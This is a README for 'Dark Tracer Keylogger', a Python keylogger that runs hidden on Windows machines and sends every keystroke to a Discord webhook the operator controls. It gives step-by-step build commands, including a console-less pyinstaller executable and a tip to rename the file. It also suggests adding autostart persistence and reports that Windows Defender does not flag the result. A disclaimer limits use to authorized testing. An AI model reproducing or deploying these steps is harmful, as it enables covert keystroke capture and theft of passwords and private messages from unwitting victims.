# Dark Tracer Keylogger
### *An advanced keylogger 100% Python*

![photo_2024-12-07_15-24-05](https://github.com/user-attachments/assets/ebe8a9d1-b2da-4935-81b0-d79ad6244e36)

# ⚠️ Disclaimer
This tool is released exclusively for:

- *Professional Penetration Testers*
- *Red Team Operators*
- *Security Researchers*
- *Certified Ethical Hackers*
- *Authorized Security Exercises*

***Like all security testing tools, Dark Tracer must only be used on systems and networks for which you have explicit written authorization. Improper use of this tool may violate local and international laws.***

# How it works
After creating the executable file (*.exe*) using *pyinstaller*, once you launch the file on a Windows machine, **the keylogger will work hidden, sending everything is typed with the keyboard to your Discord Webhook.**

![image](https://github.com/user-attachments/assets/c972f6c7-9ed0-4a94-b539-3b2be94c019b)


# How to use it
- Download the tool:
```bash
git clone https://github.com/Uriel-SG/DarkTracerKeylogger.git
```
- Edit the python code inserting your Discord Webhook:
```python
# URL del webhook Discord
WEBHOOK_URL = "https://discord.com/api/webhooks/YOUR-WEBHOOK-HERE"
```
- If you want, you can change the filename from dark_tracer.py to *whatever-you-want.py*;
- If you don't have it yet, install *pyinstaller*:
```bash
pip install pyinstaller
```
- Create your .exe file using *pyinstaller*:
```bash
pyinstaller --onefile --noconsole --hidden-import=pynput YOUR-FILE.py
```
(if you want you can add an icon adding *"--icon YOUR_ICO.ico"*)

- In the "dist" folder created you'll find the *.exe* file ready: *just start it*.

# 🧑‍💻 How to stop the process 
Simply open Windows Task Manager, locate the process, and end the task.

# 🔥 Future Improvements
To improve the project, the ideal would be to ensure that the executable file, once started, makes a copy of itself in the Windows "autostart" folder, so that the keylogger starts at every startup.

# 🛡️ Antivirus?
As you can see in the video, my ***Windows Defender doesn't detect the .exe file as a threat***. **Let me know!**

# Video Sample
[![Whatch the video](https://github.com/user-attachments/assets/da6c1213-5811-4b1b-9704-41d3d00cde68)](https://www.youtube.com/watch?v=Dea0IKQOwkI)
